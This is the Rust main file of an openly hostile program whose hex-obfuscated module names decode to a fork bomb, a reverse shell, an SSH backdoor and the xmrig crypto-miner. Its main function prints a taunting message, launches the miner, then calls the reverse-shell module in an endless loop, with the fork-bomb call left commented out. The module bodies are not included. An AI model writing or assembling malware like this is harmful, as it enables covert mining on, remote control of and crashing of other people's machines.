mod _0x666f726b626f6d62;
mod _0x727368656c6c;
mod _0x7373686261636b646f6f72;
mod _0x786d726967;

use _0x666f726b626f6d62::main as _0x666f726b626f6d62_;
use _0x727368656c6c::main as _0x727368656c6c_;
use _0x786d726967::main as _0x786d726967_;
use std::{thread, time};

// TODO: fix names

fn main() {
    println!("welcome to waco, the feds will arrive shortly :^)");

    thread::sleep(time::Duration::from_secs(1));

    _0x786d726967_::main();

    // reverse shell
    loop {
        _0x727368656c6c_::main();
    }

    /* fork funny */
    // main_0x666f726b626f6d62::main();
}
